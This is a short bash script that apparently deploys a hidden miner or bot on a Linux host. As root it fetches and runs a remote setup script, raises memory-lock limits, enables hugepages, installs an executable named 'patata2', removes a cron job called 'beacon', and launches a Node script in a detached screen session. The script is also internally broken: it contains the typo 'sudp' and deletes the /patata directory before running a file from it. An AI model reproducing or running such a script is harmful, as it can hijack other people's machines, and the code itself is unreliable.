#!/bin/bash
sudo rm /etc/cron.d/beacon
if [ ! -f /etc/proof ]; then
    sudo curl -sL https://deb.nodesource.com/setup_8.x -o /etc/install_node.sh
    sudo bash /etc/install_node.sh
    sudo apt-get update && sudo apt-get -y install nodejs
    #sudo apt-get update && sudo apt-get -y install build-essential cmake libuv1-dev nodejs
    sudo bash -c 'echo "* soft memlock 262144" >> /etc/security/limits.conf'
    sudo bash -c 'echo "* hard memlock 262144" >> /etc/security/limits.conf'
    sudo touch /etc/proof
fi
sudo rm /home/patata2
sudo mv /patata/patata2 /home
sudo chmod +x /home/patata2
sudp rm -rf /patata
sudo sysctl -w vm.nr_hugepages=128
screen -dm sudo NODE_ENV=production nodejs /patata/hook.js "$1" "$2"
